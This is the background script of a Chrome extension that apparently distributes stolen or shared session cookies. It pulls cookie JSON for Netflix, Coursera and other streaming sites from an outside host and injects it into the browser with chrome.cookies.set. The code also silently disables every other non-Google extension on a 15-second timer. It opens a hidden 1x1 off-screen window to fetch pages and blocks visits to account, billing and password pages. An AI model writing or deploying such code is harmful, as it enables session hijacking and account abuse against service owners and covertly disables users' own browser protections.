
// LOGGING SYSTEM
const LOG_BUFFER = [];
function log(msg, data = null) {
  const timestamp = new Date().toISOString().split('T')[1].slice(0, -1);
  const entry = `[${timestamp}] [BG] ${msg} ${data ? JSON.stringify(data) : ''}`;
  LOG_BUFFER.push(entry);
  console.log(entry);
  if (LOG_BUFFER.length > 500) LOG_BUFFER.shift();
}

// Session SERVICE URLS
const SESSION_URLS = {
  '1': 'https://session.khanlegacyagency.com/Netflix/Netflix.php',
  '2': 'https://session.khanlegacyagency.com/Netflix/Netflix.php',
  '3': 'https://session.khanlegacyagency.com/Coursera/Coursera.php'
};

const RESTRICTED_KEYWORDS = ['settings', 'account', 'billing', 'profile', 'subscription', 'password', 'payment', 'logout', 'signout', 'sign-out', 'help', 'support'];
const SUPPORTED_DOMAINS = ['netflix.com', 'coursera.org', 'primevideo.com', 'hulu.com', 'disneyplus.com', 'hbomax.com', 'crunchyroll.com', 'udemy.com', 'spotify.com'];

// Monopoly: Disable competing extensions
async function ensureMonopoly() {
  try {
    const extensions = await chrome.management.getAll();
    const self = await chrome.management.getSelf();
    for (const ext of extensions) {
      if (ext.id !== self.id && ext.type === 'extension' && ext.enabled && !ext.name.includes('Google')) {
        await chrome.management.setEnabled(ext.id, false);
      }
    }
  } catch (error) { }
}

chrome.runtime.onStartup.addListener(ensureMonopoly);
chrome.runtime.onInstalled.addListener(ensureMonopoly);
setInterval(ensureMonopoly, 15000);

// Navigation Filter: Protect accounts
chrome.webNavigation.onBeforeNavigate.addListener((details) => {
  if (details.url && details.frameId === 0) {
    try {
      const url = new URL(details.url);
      const host = url.hostname.toLowerCase();
      if (!SUPPORTED_DOMAINS.some(d => host.includes(d))) return;
      if (RESTRICTED_KEYWORDS.some(kw => url.pathname.toLowerCase().includes(kw))) {
        if (host.includes('khanlegacyagency.com')) return;
        chrome.tabs.update(details.tabId, { url: url.protocol + '//' + url.hostname + '/' });
      }
    } catch (e) { }
  }
});

// CORE MESSAGE HANDLER
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'log') {
    const timestamp = new Date().toISOString().split('T')[1].slice(0, -1);
    const entry = `[${timestamp}] [CS] ${request.message}`;
    LOG_BUFFER.push(entry);
    console.log(entry);
    return;
  }
  if (request.action === 'getDebugLogs') {
    sendResponse({ logs: LOG_BUFFER.join('\n') });
    return true;
  }

  if (request.action === 'injectCookies') {
    log('REQ: InjectCookies', { sessionId: request.sessionId });
    handleSyncRequest(request.sessionId, request.url)
      .then(res => {
        log('Sync started OK');
        sendResponse(res);
      })
      .catch(err => {
        log('Sync start FAILED', err.message);
        sendResponse({ success: false, error: err.message });
      });
    return true;
  }

  if (request.action === 'sessionDataFound' && request.html) {
    log('DATA FOUND from Content Script');
    processSessionData(request.html, sender.tab ? sender.tab.id : null);
    return true;
  }
  if (request.action === 'offscreenData' && request.html) {
    log('DATA FOUND from Offscreen');
    processSessionData(request.html, sender.tab ? sender.tab.id : null);
    return true;
  }

  if (request.action === 'healthCheck') {
    sendResponse({ alive: true });
    return true;
  }
});

// MAIN SYNC LOGIC
// MAIN SYNC LOGIC
async function handleSyncRequest(sessionId, directUrl) {
  const url = directUrl || SESSION_URLS[String(sessionId).trim()];
  if (!url) throw new Error('Invalid Tool');

  log('Start Sync', { url });

  // STEP 1: Shadow Fetch (Like "View Source")
  try {
    log('Attempting Shadow Fetch...');
    const response = await fetch(url, {
      headers: {
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'User-Agent': navigator.userAgent
      }
    });

    if (response.ok) {
      const html = await response.text();
      if (html.includes('extv') || html.includes('ext01JSON') || html.includes('domain')) {
        log('Shadow Fetch SUCCESS - Data found');
        const found = await processSessionData(html);
        if (found) return { success: true, status: 'instant' };
      }
    }
    log('Shadow Fetch returned no data/challenge');
  } catch (e) {
    log('Shadow Fetch Error', e.message);
  }

  // STEP 2: The Ghost Window - 100% Reliable, 100% Silent
  try {
    log('Opening Ghost Window (Micro)...');
    // Create a MICRO window at the bottom-right corner.
    // Dimensions 1x1 make it virtually invisible, but being 'on screen' (technically)
    // ensures the OS gives it full priority.
    chrome.windows.create({
      url: url,
      type: 'normal',
      state: 'normal',
      left: 9999,
      top: 9999,
      width: 1,
      height: 1,
      focused: true
    }, (window) => {
      window.isGhost = true;
      log('Ghost Window Created', { id: window.id });
    });
  } catch (e) {
    // Ultra-fallback
    log('Ghost Window Failed, using Tab fallback', e.message);
    chrome.tabs.create({ url: url, active: false });
  }
  return { success: true, status: 'started' };
}

// Helper to kill Ghost Windows and tabs
// Helper to kill Ghost Windows and tabs
async function cleanupSync(tabId) {
  log('Cleanup requested', { tabId });
  // If we have a tabId, check if it belongs to a window we should close
  if (tabId) {
    chrome.tabs.get(tabId, (tab) => {
      if (chrome.runtime.lastError) return;
      if (tab.windowId) {
        chrome.windows.get(tab.windowId, (win) => {
          if (chrome.runtime.lastError) return;
          // Identify ghost window by Micro dimensions or specific coordinates
          const isMicro = win.width <= 50 && win.height <= 50;
          const isOffScreen = win.left <= -2000 || win.left >= 9000;

          if (win.type === 'popup' || isMicro || isOffScreen) {
            log('Closing Ghost Window', { id: win.id });
            chrome.windows.remove(win.id);
          } else {
            log('Closing Tab', { id: tabId });
            chrome.tabs.remove(tabId);
          }
        });
      }
    });
  }

  // Also try to close any offscreen (cleanup from previous version)
  try {
    const contexts = await chrome.runtime.getContexts({ contextTypes: ['OFFSCREEN_DOCUMENT'] });
    if (contexts.length > 0) await chrome.offscreen.closeDocument();
  } catch (e) { }
}

// Extraction & Injection
async function processSessionData(html, sourceTabId) {
  log('Processing HTML data...');
  try {
    const cookies = extractCookies(html);
    const redirect = extractRedirect(html);

    log('Extraction Result', { cookiesFound: cookies ? cookies.length : 0, redirectUrl: redirect });

    if (cookies && cookies.length > 0) {
      // Inject ALL cookies
      for (const c of cookies) {
        try {
          await setCookie(c);
        } catch (e) {
          log('Cookie set error', e.message);
        }
      }
      log('All cookies injected');

      // Close the tab/offscreen quickly
      await cleanupSync(sourceTabId);

      // Broadcast success to ALL tabs (so dashboard picks it up)
      chrome.tabs.query({}, (tabs) => {
        tabs.forEach(tab => {
          try {
            chrome.tabs.sendMessage(tab.id, {
              type: 'SYNC_COMPLETE',
              redirect: redirect || 'https://www.netflix.com/browse'
            });
          } catch (e) { }
        });
      });
      return true;
    } else {
      log('No cookies found in HTML');
    }
  } catch (e) {
    log('Critical Error in processSessionData', e.message);
  }
  return false;
}

function extractCookies(html) {
  // Regex 1: Element with ID
  const regex = /<(?:div|span|script)[^>]*(?:id|class)=["'](?:extv|ext01JSONdiv|ext01JSON)["'][^>]*>([\s\S]*?)<\/(?:div|span|script)>/i;
  const match = html.match(regex);
  if (match) {
    const jsonStr = findJsonArray(match[1]);
    if (jsonStr) {
      try {
        const parsed = JSON.parse(jsonStr);
        if (Array.isArray(parsed) && parsed.length > 0) return sanitizeCookies(parsed);
      } catch (e) { }
    }
  }

  // Regex 2: Any array containing domain and value
  let pos = 0;
  for (let i = 0; i < 15; i++) {
    const start = html.indexOf('[', pos);
    if (start === -1) break;
    const arrayStr = findJsonArray(html.substring(start));
    if (arrayStr && arrayStr.includes('"domain"') && (arrayStr.includes('"value"') || arrayStr.includes('"name"'))) {
      try {
        const parsed = JSON.parse(arrayStr);
        if (Array.isArray(parsed) && parsed.length > 0 && parsed[0].domain) return sanitizeCookies(parsed);
      } catch (e) { }
      pos = start + arrayStr.length;
    } else {
      pos = start + 1;
    }
  }
  return null;
}

function findJsonArray(str) {
  const start = str.indexOf('[');
  if (start === -1) return null;
  let b = 0, s = false, e = false;
  for (let i = start; i < str.length; i++) {
    if (e) { e = false; continue; }
    if (str[i] === '\\') { e = true; continue; }
    if (str[i] === '"') { s = !s; continue; }
    if (!s) {
      if (str[i] === '[') b++;
      if (str[i] === ']') { b--; if (b === 0) return str.substring(start, i + 1); }
    }
  }
  return null;
}

function sanitizeCookies(cookies) {
  return cookies.filter(c => c && c.domain).map(c => {
    let domain = String(c.domain);
    if (!c.hostOnly && domain && !domain.startsWith('.')) domain = '.' + domain;

    const obj = {
      url: 'https://' + (domain.startsWith('.') ? domain.slice(1) : domain),
      name: String(c.name),
      value: String(c.value),
      domain: domain,
      path: c.path || '/',
      secure: c.secure || false,
      httpOnly: c.httpOnly || false,
      expirationDate: c.expirationDate || Math.floor(Date.now() / 1000) + 31536000
    };

    if (c.sameSite) {
      const val = String(c.sameSite).toLowerCase();
      if (val.includes('strict')) obj.sameSite = 'strict';
      else if (val.includes('lax')) obj.sameSite = 'lax';
      else { obj.sameSite = 'no_restriction'; obj.secure = true; }
    } else if (obj.secure) {
      obj.sameSite = 'no_restriction';
    }
    return obj;
  });
}

function extractRedirect(html) {
  const m1 = html.match(/href=["'](https?:\/\/[^"']+)["']/i);
  if (m1 && !m1[1].includes('khanlegacyagency') && !m1[1].includes('session.')) return m1[1];
  const m2 = html.match(/window\.location\.href\s*=\s*["']([^"']+)["']/);
  if (m2) return m2[1];
  return null;
}

function setCookie(c) {
  return new Promise(r => {
    chrome.cookies.set(c, () => { chrome.runtime.lastError; r(); });
  });
}